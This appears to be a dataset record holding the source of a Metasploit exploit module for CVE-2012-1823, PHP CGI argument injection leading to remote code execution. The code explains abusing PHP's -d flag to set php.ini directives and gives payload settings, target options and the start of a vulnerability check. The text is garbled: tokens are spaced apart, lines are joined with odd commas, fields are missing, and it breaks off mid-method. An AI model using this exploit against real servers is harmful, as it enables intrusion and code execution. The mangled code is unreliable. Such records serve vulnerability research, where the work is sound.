{
    "text": "vul_name : PHP up to 5.3.12 and 5.4.2 CGI Injection ( metasploit exploit )  ， vul_cve : CVE-2012-1823 ， vul_poc :  ，  #  $ Id $  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， super ( update_info ( info ,  ， 'Name' => 'PHP CGI Argument Injection' ,  ， 'Description' => %q{ ， When run as a CGI , PHP up to version 5.3.12 and 5.4.2 is vulnerable to ， an argument injection vulnerability. This module takes advantage of ， the -d flag to set php.ini directives to achieve code execution. ， From the advisory : \"if there is NO unescaped '=' in the query string ,  ， the string is split on '+' ( encoded space ) characters , urldecoded ,  ， passed to a function that escapes shell metacharacters ( the \"encoded in ， a system-defined manner\" from the RFC ) and then passes them to the CGI ， binary.\" ， } ,  ， 'Author' => [ 'egypt' , 'hdm' ]  ,  ， 'License' => MSF_LICENSE ,  ， 'Version' => ' $ Revision $ ' ,  ， ' ，  [ 'CVE' , '2012-1823' ]  ,  ，  [ 'OSVDB' , '81633' ]  ,  ，  [ 'URL' , ' ]  ,  ，  ]  ,  ， 'Privileged' => false ,  ， 'Payload' => ， { ， 'DisableNops' => true ,  ，  # Arbitrary big number. The payload gets sent as an HTTP ，  # response body , so really it's unlimited ， 'Space' => 262144 ,  # 256k ， } ,  ， 'DisclosureDate' => 'May 03 2012' ,  ， 'Platform' => 'php' ,  ， 'Arch' => ARCH_PHP ,  ， 'Targets' => [ 'Automatic' , { } ]  ,  ， 'DefaultTarget' => 0 )  ， register_options (  [  ， OptString.new ( 'TARGETURI' ,  [ false , \"The URI to request ( must be a CGI-handled PHP script ) \" ]  )  ,  ，  ]  , self.class )  ， end ，  # php-cgi -h ，  # . ，  # -s Display colour syntax highlighted source. ， def check ， uri = target_uri.path ， uri.gsub !  ( /\\?. * / , \" )  ， print_status ( \"Checking uri # {uri}\" )  ， response = send_request_raw ( { 'uri' => uri } )  ， print_error ( \"Server responded in a way that was ambiguous , could not determine whether it was vulnerable\" ) ",
    "time": "2012.05.06"
}